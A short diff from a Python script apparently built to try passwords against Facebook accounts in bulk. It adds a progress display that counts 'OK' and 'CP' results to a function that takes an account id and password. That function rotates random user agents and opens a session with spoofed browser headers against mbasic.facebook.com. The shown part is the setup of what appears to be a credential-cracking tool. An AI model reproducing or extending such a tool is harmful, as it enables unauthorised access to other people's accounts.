@@ -1211,6 +1211,10 @@ def _async(idf,pwv):
 	loop+=1
  
 def memex(idf,pwv):
+
+	global loop,ok,cp
+	prog.update(des,description=f'\r[bold white]Dapunta [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
+	prog.advance(des)
 	ua = random.choice(free)
 	r = requests.Session()
 	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
